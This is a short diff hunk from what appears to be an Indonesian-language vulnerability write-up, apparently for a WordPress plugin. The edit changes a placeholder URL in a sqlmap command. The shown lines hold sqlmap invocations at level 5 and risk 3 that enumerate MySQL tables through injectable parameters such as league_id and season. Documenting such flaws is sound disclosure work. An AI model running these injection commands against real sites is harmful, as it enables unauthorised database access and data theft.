@@ -136,7 +136,7 @@ python sqlmap.py --url "http://alamat_site?match=1" --level 5 --risk 3 --dbms my
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hasil:
 
 - atau:<pre>
-python sqlmap.py --url "http://alamat_post_mengandung_plugin?league_id=1&season=Winter" --level 5 --risk 3 --dbms mysql --tables
+python sqlmap.py --url "http://alamat_site?league_id=1&season=Winter" --level 5 --risk 3 --dbms mysql --tables
 </pre>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hasil:
 
